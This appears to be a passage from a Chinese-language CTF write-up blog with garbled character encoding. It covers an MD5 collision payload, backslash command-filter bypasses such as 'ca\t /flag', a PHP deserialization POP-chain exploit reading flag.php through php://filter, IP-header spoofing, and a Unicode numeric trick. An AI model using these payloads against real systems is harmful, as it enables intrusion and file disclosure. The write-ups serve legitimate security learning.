class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure>
<p>åå¼•å·ä¸ºsystem<br>ls&amp;catè¢«ç¦ç”¨ï¼Ÿ<br>æ²¡å…³ç³»<br>åæ–œæ ç»•è¿‡</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s%<span class="hljs-number">20</span>/<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>ca\t%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure>

<p>å¼ºç¢°æ’ä¸å»ºè®®ç”¨hackbarï¼Œç”¨burp</p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>å…ˆä¸Šæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>ä¸€å…±ä¸‰ä¸ªç±»</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">Modifier<br><span class="hljs-keyword">Show</span><br><span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure>

<p>å…ˆåˆ†æModifierç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>å®šä¹‰ä¸€ä¸ªappendå‡½æ•°<br>æœ‰ä¸ªincludeï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¼ªåè®®æ¥è·å¾—flag.phpçš„å†…å®¹ï¼Œè€Œincludeéœ€è¦__invokeæ–¹æ³•æ¥è°ƒç”¨ï¼Œ__invokeè§¦å‘æ–¹æ³•ä¸ºï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ã€‚</p>
<p>å†æ¥åˆ†æShowç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>å…ˆçœ‹__toStringæ–¹æ³•ï¼Œæ˜¯ä¸ªè¾“å‡ºç‚¹</p>
<p>æœ€ååˆ†æTestç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>__get()æ–¹æ³•ï¼Œ(å½“è®¿é—®ç±»ä¸­çš„ç§æœ‰å±æ€§æˆ–è€…æ˜¯ä¸å­˜åœ¨çš„å±æ€§ï¼Œè§¦å‘__geté­”æœ¯æ–¹æ³•)ï¼Œè€ŒModifierç±»ä¸­æœ‰ç§æœ‰å±æ€§ï¼Œè¿™ä¸¤ä¸ªç±»é…åˆä¸€ä¸‹</p>
<p>æ€è·¯ï¼š<br>é¦–å…ˆä½¿</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$var</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>ç”±äºprotectè¢«ä¿æŠ¤çš„å˜é‡ç±»å¤–éƒ¨æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥åœ¨ç±»é‡Œé¢å®šä¹‰<br>ç„¶åä½¿ç”¨Testç±»é‡Œçš„__getæ–¹æ³•è°ƒç”¨Modifierç±»ä¸­çš„__invokeæ–¹æ³•ï¼Œä½¿$pè¿™ä¸ªå˜é‡ä¸ºModifierè¿™ä¸ªå¯¹è±¡å°±å¯ä»¥è°ƒç”¨__invokeæ–¹æ³•ï¼Œæœ€åä½¿ç”¨Showè¿™ä¸ªç±»é‡Œçš„__toStringæ–¹æ³•è¾“å‡ºè¢«åŒ…å«çš„flag<br>ä½¿ç”¨Testç±»ä¸­çš„__Getæ–¹æ³•è°ƒç”¨Modifierç±»ä¸­çš„__invokeæ–¹æ³•å¾ˆç®€å•<br>ä½¿Test-&gt;p&#x3D;new Modifier();<br>Showä¸­__wakeupæ–¹æ³• ï¼Œpreg_matchå¯¹ç±»ä¸­çš„sourceè¿›è¡Œæ¯”è¾ƒï¼Œå°†å®ƒä½œä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±è°ƒç”¨äº†__toStringæ–¹æ³•<br>__toStringæ˜¯åœ¨å¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™è°ƒç”¨<br>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿Show-&gt;source &#x3D; new Show();<br>å³å¯è°ƒç”¨__toStringæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;index.php&quot;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;source . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;source-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>

<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="/images/MQ083D130OO6OYCG15V.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œçš„buy it now æ˜¯æœ‰è¶…é“¾æ¥çš„<br>å¾®ä¿¡æ‰«ä¸€æ‰«å…ˆ<br><img src="/images/YNUL3D1EKV4C5VP4.png" srcset="/img/loading.gif" lazyload><br>æ‹œæ‰˜ï¼ä½ ä¸ä¼šçœŸçš„æƒ³PYåˆ°flagå§ï¼Œè¿™æ ·å¯æ˜¯è¿è§„çš„ï¼å†å¥½å¥½åˆ†æä¸€ä¸‹ç•Œé¢ä»£ç å§<br>å¥½å§ï¼Œå¦è¾Ÿè¹Šå¾„<br>å›åˆ°ä¸»é¡µé¢ï¼Œå®¡è®¡æºä»£ç </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>     <span class="hljs-built_in">hash</span> = hex_md5(code);<br>     <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>;<br>   &#125;<br>   <span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> code = document.getElementById(<span class="hljs-string">&quot;vcode&quot;</span>).value;<br>     <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>       <span class="hljs-keyword">if</span>(hex_md5(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>         alert(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;</span>);<br>         window.location = <span class="hljs-string">&quot;./flag.php&quot;</span><br>       &#125;<span class="hljs-keyword">else</span>&#123;<br>         alert(<span class="hljs-string">&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;</span>);<br>       &#125;<br>     &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;è¯·è¾“å…¥æˆæƒç &quot;</span>);<br>     &#125;<br>     <br>   &#125;<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œæœ‰ä¸ªflag.phpï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥æŸ¥çœ‹<br><img src="/images/Y1HGFWJWYOPXT3ZN3L.png" srcset="/img/loading.gif" lazyload><br>é‡ç‚¹æ˜¯è¿™ä¸€å¥è¯ï¼š<br>éªŒè¯é€»è¾‘æ˜¯åœ¨åç«¯çš„ï¼Œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag<br>é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Ÿ<br>ä¼ªé€ IPè¯•è¯•<br><img src="/images/6OLV4250O66RIYHW5SM.png" srcset="/img/loading.gif" lazyload><br><img src="/images/JFJQBMOYHR56UBL4MK.png" srcset="/img/loading.gif" lazyload><br>æºä»£ç ä¸­æŸ¥çœ‹flag</p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/images/HHE63JPRZK5VP8UO.png" srcset="/img/loading.gif" lazyload><br>çœ‹åˆ°ç»™çš„å†å²è¾“å…¥ï¼Œè¿˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œæ³¨å…¥äº†åŠå¤©æ¯›éƒ½æ²¡æœ‰<br>çœ‹çœ‹æºç ğŸ‘€<br><img src="/images/CCBM03PTUN15DEK50F.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œæç¤º<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>éå¸¸é‡è¦<br>ä½†æ˜¯å¾ˆå¤šçš„ç½‘ç«™éƒ½æ˜¯utf-8ç¼–ç ï¼Œä¸ºä»€ä¹ˆä¼šè¯´è¿™é‡Œå¾ˆé‡è¦?<br>å›åˆ°è´­ä¹°ç•Œé¢ï¼Œæˆ‘ä»¬è¾“å…¥å…¶ä»–çš„ä»·æ ¼ï¼Œå‘ç°è¾“å…¥10çš„æ—¶å€™æœ‰æç¤º<br><img src="/images/SJJVW90CRI7BP0MK.png" srcset="/img/loading.gif" lazyload><br>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦<br>ä¸€ä¸ªå­—ç¬¦èƒ½å¤Ÿè´­ä¹°çš„å°±åªæœ‰å‰ä¸‰åªç‹¬è§’å…½ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰è´­ä¹°æˆåŠŸï¼Œæƒ³å¿…çªç ´ç‚¹åœ¨ç¬¬å››åªç‹¬è§’å…½ä¸Šï¼Œå…ˆæ‰¾åˆ°ä¸€ä¸ªæ¯”1337å¤§çš„æ•°<br>å½“ä»€ä¹ˆéƒ½ä¸è¾“å…¥ç›´æ¥è´­ä¹°æ—¶ä¼šå‡ºç°ä»¥ä¸‹æç¤º<br><img src="/images/435G6RU5DA6HCN26.png" srcset="/img/loading.gif" lazyload><br>çœ‹ä¸€ä¸‹ unicodedata.numericè¿™ä¸ªå‡½æ•°ï¼Œä»–çš„å‚æ•°æ˜¯price<br>å‰ç«¯htmlä½¿ç”¨çš„æ˜¯utf-8ï¼Œåç«¯pythonå¤„ç†ä½¿ç”¨çš„æ˜¯unicodeï¼Œç¼–ç ä¸ä¸€è‡´é€ æˆäº†è½¬ç é—®é¢˜<br><img src="/images/LQ1B771Y202IYPQOL.png" srcset="/img/loading.gif" lazyload><br><img src="/images/D585S3GQB0CTVOHB9L.png" srcset="/img/loading.gif" lazyload><br>ä¼ å…¥ä¸‡è¯•è¯•<br><img src="/images/IZ87OSEJ633X4O7QBBE.png" srcset="/img/loading.gif" lazyload><br>flagæˆåŠŸå›æ˜¾<br>å¦‚æœä¸æƒ³ç”¨ä¸‡çš„è¯å¯ä»¥å»æ‰¾ä¸€ä¸ªUnicodeç¼–ç ç½‘ç«™<br><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">ä¼ é€é—¨</a><br>ä¾‹å¦‚è¾“å…¥ten thousand<br><img src="/images/NMW9LJLO5NYALOX.png" srcset="/img/loading.gif" lazyload><br><img src="/images/RT4UKBT5P80RZT5.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°ä¸€ä¸ªNumeric Valueå¤§äºç­‰äº10000çš„æ•°å€¼<br>ç›´æ¥å¤åˆ¶ä¸Šé¢çš„ç‰¹æ®Šç¬¦å·æˆ–è€…ä¸‹é¢çš„UTF-8 Encoding<br>æ‰¾åˆ°UTF-8 Encodingï¼š0xE1 0x8D 0xBC<br>å°†0xæ›¿æ¢æˆ%<br><img src="/images/LLNDIZB7VBGLF9K12S.png" srcset="/img/loading.gif" lazyload><br>è´­ä¹°å¾—åˆ°flag</p>
